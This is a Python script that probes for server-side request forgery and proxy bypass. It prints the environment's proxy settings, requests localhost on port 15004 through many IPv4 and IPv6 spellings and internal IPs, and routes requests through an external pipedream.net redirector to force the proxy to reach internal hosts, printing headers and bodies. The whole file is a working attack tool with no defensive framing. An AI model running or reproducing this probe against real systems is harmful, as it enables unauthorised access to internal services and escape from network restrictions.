import os
import requests
from urllib.parse import quote

# Environment variables (actual values at runtime)
HTTP_PROXY = os.environ.get("HTTP_PROXY")
HTTPS_PROXY = os.environ.get("HTTPS_PROXY", HTTP_PROXY)
NO_PROXY = os.environ.get("NO_PROXY", "")

PROXIES = {
    "http": HTTP_PROXY,
    "https": HTTPS_PROXY,
}

print("=== ENVIRONMENT ===")
print("HTTP_PROXY =", HTTP_PROXY)
print("HTTPS_PROXY =", HTTPS_PROXY)
print("NO_PROXY =", NO_PROXY)
print("====================\n")

# --- Redirect handler base ---
REDIR_BASE = "https://eoc2zh1zdnnlrhx.m.pipedream.net?location="


def loc(url):
    """Helper to build redirect URLs."""
    return REDIR_BASE + quote(url)


# --- IPv4 localhost targets (with port 15004) ---
IPV4_LOCAL = [
    "http://127.0.0.1:15004",
    "http://localhost:15004",
    "https://127.0.0.1:15004",
    "https://localhost:15004",
]

# --- IPv6 localhost variants on port 15004 ---
IPV6_LOCAL = [
    "http://[::1]:15004",
    "https://[::1]:15004",
    "http://[0:0:0:0:0:0:0:1]:15004",
    "https://[0:0:0:0:0:0:0:1]:15004",
    "http://[::ffff:127.0.0.1]:15004",
    "https://[::ffff:127.0.0.1]:15004",

    # Less common but sometimes reachable
    "http://::1:15004",
    "https://::1:15004",
]

# --- Internal IP ranges on 15004 ---
INTERNAL_IPS = [
    "http://10.0.0.1:15004",
    "http://172.17.0.1:15004",
    "http://192.168.0.1:15004",
    "http://0.0.0.0:15004",
]

# Build redirect versions (force proxy traversal)
REDIRECT_TESTS = [
    loc(target) for target in IPV4_LOCAL + IPV6_LOCAL + INTERNAL_IPS
]


def try_request(url, use_proxy=True):
    print(f"\n--- Testing URL: {url}   (use_proxy={use_proxy}) ---")
    try:
        if use_proxy:
            r = requests.get(url, proxies=PROXIES, timeout=5, allow_redirects=False)
        else:
            r = requests.get(url, timeout=5, allow_redirects=False)

        print("Status:", r.status_code)
        print("Headers:", dict(r.headers))
        print("Body (first 500b):", r.text[:500])

    except Exception as e:
        print("Exception:", type(e).__name__, str(e))


def main():
    print("### IPv4 Localhost Tests ###")
    for t in IPV4_LOCAL:
        try_request(t, use_proxy=False)
        try_request(t, use_proxy=True)

    print("\n### IPv6 Localhost Tests ###")
    for t in IPV6_LOCAL:
        try_request(t, use_proxy=False)
        try_request(t, use_proxy=True)

    print("\n### Internal IP Range Tests ###")
    for t in INTERNAL_IPS:
        try_request(t, use_proxy=False)
        try_request(t, use_proxy=True)

    print("\n### Redirect-Based Tests (force proxy traversal) ###")
    for t in REDIRECT_TESTS:
        try_request(t, use_proxy=True)


if __name__ == "__main__":
    main()
